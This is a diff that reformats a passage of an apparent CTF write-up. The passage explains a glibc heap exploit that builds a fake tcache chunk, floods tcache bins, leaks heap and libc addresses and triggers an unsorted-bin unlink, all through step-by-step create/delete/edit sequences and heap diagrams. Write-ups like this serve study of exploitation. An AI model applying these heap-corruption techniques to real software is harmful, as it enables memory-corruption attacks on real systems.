@@ -121,21 +121,21 @@ The result should be like
 ```
      |       8       |       8       |
                     ...
-0x040|               |            301| <- tcache\_fake\_chunk
-0x050|ptr2freed\_0x20|ptr2freed\_0x30|
+0x040|               |            301| <- tcache_fake_chunk
+0x050| ptr2freed_0x20| ptr2freed_0x30|
 ```
 
 Now we have something that looks like an unsorted chunk on tcache, if we manage to perform a unlink on it, we will get a free chunk that overlaps with tcache. Actually, this is the very reason why I chose to free(0x3b0) 3 times, by doing so, we manage to set the next chunk to heap+0x340, which is at about the start of usable heap region.
 
 So we now have to try to perfrom unlink on that chunk, to do so, we must utilize the buffer overflow bug mentioned in Vulnerability section. The procedure can be outlined as this
-1. C1 = create(0x388)					//size chosen to be sum of tcache\_fake\_chunk and next\_chunk
-2. (C2 = create(0x388),delete(C2))*7	//flood tcache to let freed C1 end up in unsorted bin
-3. (C2 = create(0x88),delete(C2))*7		//flood tcache for 0x90, so the crafted next\_chunk can be freed into unsorted bin and trigger unlink
+1. C1 = create(0x388)					# size chosen to be sum of tcache\_fake\_chunk and next\_chunk
+2. (C2 = create(0x388),delete(C2))*7	# flood tcache to let freed C1 end up in unsorted bin
+3. (C2 = create(0x88),delete(C2))*7		# flood tcache for 0x90, so the crafted next\_chunk can be freed into unsorted bin and trigger unlink
 4. delete(C1)
-5. C2 = create(0xe8)					//padding the next chunk into heap+0x340
-6. C2 = create(0xf8)					//the chunk that will be modified to next\_chunk of tcache\_fake\_chunk
-7. C3 = create(0x88)					//just for exausting unsorted being at current point, usage will be explored later
-8. edit(C1, padding+fakeC2chunk(size=0x90, prev\_inuse=False, prev\_size=0x300, next\_chunk is valid))	//craft next\_chunk for tcache\_fake\_chunk
+5. C2 = create(0xe8)					# padding the next chunk into heap+0x340
+6. C2 = create(0xf8)					# the chunk that will be modified to next\_chunk of tcache\_fake\_chunk
+7. C3 = create(0x88)					# just for exausting unsorted being at current point, usage will be explored later
+8. edit(C1, padding+fakeC2chunk(size=0x90, prev\_inuse=False, prev\_size=0x300, next\_chunk is valid))	# craft next\_chunk for tcache\_fake\_chunk
 9. delete(C2)
 
 
@@ -157,23 +157,23 @@ Now we have managed to leak libc\_base, leak heap\_addr ,craft tcache\_fake\_chu
 
 The entire procedure can be illustrated as below, notice the difference between this and previous listed procedure
 1. C1 = create(0x388)
-2. C2 = create(0x388)					// for leaking heap
-3. C3 = create(0x388)					// for leaking heap
+2. C2 = create(0x388)					# for leaking heap
+3. C3 = create(0x388)					# for leaking heap
 4. delete(C2)
 5. delete(C3)
-6. show(C3)								// leak heap
-7. (C2 = create(0x398), delete(C2))		// set tcache\_fake\_chunk -> prev\_inuse = 1
-8. (C2 = delete(0x3a8), delete(C2))*3	// set tcache\_fake\_chunk -> size = 0x300
-9. (C2 = create(0x388),delete(C2))*5	// two were freed earlier, only five more needed
+6. show(C3)								# leak heap
+7. (C2 = create(0x398), delete(C2))		# set tcache\_fake\_chunk -> prev\_inuse = 1
+8. (C2 = delete(0x3a8), delete(C2))*3	# set tcache\_fake\_chunk -> size = 0x300
+9. (C2 = create(0x388),delete(C2))*5	# two were freed earlier, only five more needed
 10. (C2 = create(0x88),delete(C2))*7
-11. delete(C1)							// leak unsorted bin
+11. delete(C1)							# leak unsorted bin
 12. C2 = create(0xe8)
 13. C2 = create(0xf8)
 14. C3 = create(0x88)
-15. edit(C1, padding+fakeC3chunk(size=0x21, prev\_inuse=True, next\_chunk is valid))	// craft 0x20 chunk
-16. delete(C3)																			// set tcache\_fake\_chunk -> fd = C3+0x10
-17. edit(C1, padding+fakeC3chunk(size=0x31, prev\_inuse=True, next\_chunk is valid))	// craft 0x30 chunk
-18. delete(C3)																			// set tcache\_fake\_chunk -> bk = C3+0x10
+15. edit(C1, padding+fakeC3chunk(size=0x21, prev\_inuse=True, next\_chunk is valid))	# craft 0x20 chunk
+16. delete(C3)																			# set tcache\_fake\_chunk -> fd = C3+0x10
+17. edit(C1, padding+fakeC3chunk(size=0x31, prev\_inuse=True, next\_chunk is valid))	# craft 0x30 chunk
+18. delete(C3)																			# set tcache\_fake\_chunk -> bk = C3+0x10
 19. edit(C1, padding+fakeC2chunk(size=0x90, prev\_inuse=False, prev\_size=0x300, next\_chunk is valid)+fakeunsortedchunk(addr=C3+0x10))
 20. delete(C2)
 
@@ -186,7 +186,7 @@ if (__builtin_expect (fd->bk != p || bk->fd != p, 0))
 ```
 So to unlink properly, we have to set
 1. tcache\_fake\_chunk -> fd -> bk = tcache\_fake\_chunk
-1. tcache\_fake\_chunk -> bk -> fd = tcache\_fake\_chunk
+2. tcache\_fake\_chunk -> bk -> fd = tcache\_fake\_chunk
 
 Since both fd, bk of tcache\_fake\_chunk = C3+0x10
 fd, bk of C3+0x10 must be set to tcache\_fake\_chunk
@@ -196,7 +196,7 @@ the heap before finally freeing C2 to trigger unlink will look like
      |       8       |       8       |
                     ...
 0x040|               |            301|
-0x050|   heap+0x450  |   heap+0x450  | <- tcache\_fake\_chunk
+0x050|   heap+0x450  |   heap+0x450  | <- tcache_fake_chunk
                     ...
 0x250|               |             f1|
                     ...
@@ -205,7 +205,7 @@ the heap before finally freeing C2 to trigger unlink will look like
 0x3d0|               |             71| <- next chunk for C2, so that freeing C2 will not trigger any error
                     ...
 0x440|               |             91| <- C3
-0x450|               |               | <- fake\_unsorted\_chunk
+0x450|               |               | <- fake_unsorted_chunk
 0x460|   heap+0x40   |   heap+0x40   |
 ```
 
